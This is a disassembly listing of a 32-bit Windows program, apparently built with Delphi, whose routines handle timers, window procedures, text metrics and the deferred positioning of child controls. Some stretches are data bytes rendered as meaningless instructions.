mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42650e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4032f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_426548
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4265c7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4265ce
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
sub_426624
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] bh
inc edx
add [ eax + 0x67 ] dl
inc edx
add [ edx + eax ] bl
add [ eax ] al
pop esp
stosd [ edi ]
inc edx
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
or [ esi + 0x30900043 ] cl
inc eax
add [ eax + esi + 0x680c0040 ] ch
inc edx
add [ eax - 0x2fffbc43 ] ch
test [ ebx ] eax
sub al 0x40
inc ecx
add [ ebx + ebp * 2 + 0x43 ] ah
add [ eax + 0x3f ] ah
inc ebx
add [ edx + esi * 2 + 0x48780043 ] al
inc ebx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ edi + ebx * 8 - 0x4743ffbe ] ch
inc ebx
add al bl
mov ebp 0xbd240043
inc ebx
add ah dl
cmp eax 0xb3380043
inc ebx
add [ eax - 0x4d ] bl
inc ebx
add [ eax - 0x50 ] dh
inc ebx
add [ edi + 0x3d200043 ] bl
inc ebx
add [ ebp * 2 + 0x6d600043 ] dh
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ eax + ebx * 8 + 0x6de40042 ] al
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add ah bh
jb r-xdata
adc [ ebp - r-xdata ] edi
inc esp
push 0x69140042
inc edx
add ah dl
push 0x540c0042
add [ eax + 0x30004379 ] dl
xchg [ ebx ] eax
pushfd
loope r-xdata
push eax
mov edx eax
jne r-xdata
inc edi
jb r-xdata
imul eax [ edx ] sub_4268d4
or al 0x54
add [ eax ] bl
test [ ebx ] al
hlt
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
mov eax edi
mov ecx [ eax ]
inc edx
jne r-xdata
xor edx edx
mov eax edi
call sub_434c04
mov [ edi + 0x124 ] esi
je r-xdata
call [ ecx + 0x64 ]
outsb
lea eax [ eax ]
inc edx
add [ edi ] al
or al 0x54
inc edi
jb r-xdata
mov [ edi + 0x120 ] sub_426bb8
mov edx esi
and al 0x1
add [ eax ] al
jne r-xdata
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
add bh al
xchg [ eax ] esp
inc edx
jne r-xdata
salc
mov eax 0x8b00426b
je r-xdata
add [ eax ] eax
add [ eax - 0x74ffbd95 ] bh
outsb
insb
inc dx
add [ eax + 0x350042ac ] ah
add [ eax ] cl
inc ebp
js r-xdata
je r-xdata
inc ebx
je r-xdata
psubsb mm4 [ ecx - 0x34 ]
std
jmp [ edi + ecx * 4 + 0x5 ]
insb
jae r-xdata
add [ eax - 0x7ba8a9ad ] dl
shl [ eax + ecx - 0x7d ] cl
sub_426788
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_42dfac
mov edx edi
mov eax [ esi + 0x210 ]
call sub_413898
xor edx edx
mov eax edi
call sub_4349b0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_434c04
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_426bb8
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_42680c
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_413b90
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4370e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_426844
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_4268a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42e2ac
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_4268ae
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4544c0
call sub_4038e8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4268d4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_43a274
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_4032f4
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_426914
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_43a0bc
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_4032f4
pop edx
pop esi
pop ebx
retn
sub_426940
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42bb3c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_426bf0
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4269d0
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_426c64
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_4030f8
mov eax [ esi + 0x210 ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43cf50
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_426a20
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_41cd3c
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_426ba9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_43b290
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_4349b0
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_434494
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_4139f4
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_4032f4
test al al
je r-xdata
sub_426bb8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_413a50
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_43469c
mov eax ebx
mov si 0xffeb
call sub_4032f4
sub_426bf0
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_426d68
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_426c64
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_426788
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_413adc
call sub_4030f8
pop edi
pop esi
pop ebx
retn
sub_426ca4
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_426a20
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_426cdc
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_4139f4
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4139f4
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_426d68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_426e31
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_426c64
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_426a20
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e38
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_4139f4
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_4139f4
pop edx
call sub_434ac0
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_426e40
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43a77c
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4139f4
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_426eb4
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi + edi * 8 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ esi ] bh
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + 0x46 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + 0x46 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + 0x46 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc esi
add [ esi ] ah
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + 0x46 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + 0x46 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + 0x46 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc esi
add [ esi ] ch
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + 0x46 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc esi
add [ esi ] dl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc esi
add [ esi ] bl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + 0x46 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + 0x46 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc esi
add [ esi ] al
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + 0x46 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edx ] cl
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ eax ] cl
mov [ esi ] eax
and al 0x70
inc edx
add [ eax ] al
mov [ esi ] eax
sbb al 0x70
inc edx
add al bh
mov [ esi ] al
adc al 0x70
inc edx
add al dh
mov [ esi ] al
or al 0x70
inc edx
add al ch
mov [ esi ] al
add al 0x70
inc edx
add al ah
mov [ esi ] al
cld
outsd
inc edx
add al bl
mov [ esi ] al
hlt
sub_427220
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427245
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42724c
retn
sub_427258
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427289
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427290
retn
mov eax [ rw-data ]
call sub_4030f8
sub_42741c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427441
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427448
retn
sub_427463
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4274a8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4274af
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404930
sub_4274cb
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_427510
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427517
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404930
sub_427527
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42757d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427584
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403eb4
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_427590
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4275d4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4275db
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4275e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42760d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427614
retn
sub_427620
insb
jbe r-xdata
xor [ eax ] al
call 0xfffffffff842b69d
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x42 ] dh
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x28004010 ]
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
je r-xdata
add [ edi + esi * 2 ] cl
inc edx
add [ ebx ] cl
push esp
inc ebx
outsd
outsb
jbe r-xdata
push ebx
adc [ ebx + 0x5d ] bl
retn 0x4
add bh bh
jb r-xdata
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
push sub_42778f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427796
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4048e4
mov eax rw-data
mov edx [ r-xdata ]
call sub_4048e4
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_427720
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42778f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427796
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4048e4
mov eax rw-data
mov edx [ r-xdata ]
call sub_4048e4
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4279e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_424b00
mov [ esi + 0x5 ] al
call sub_4276c0
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_42822c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_427a34
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax esi
call sub_427ad4
call sub_424940
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_427a68
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_427ad4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_427b18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_427a68
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_427b64
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_427a68
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_427ba8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_427a68
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_427c10
push ebp
mov ebp esp
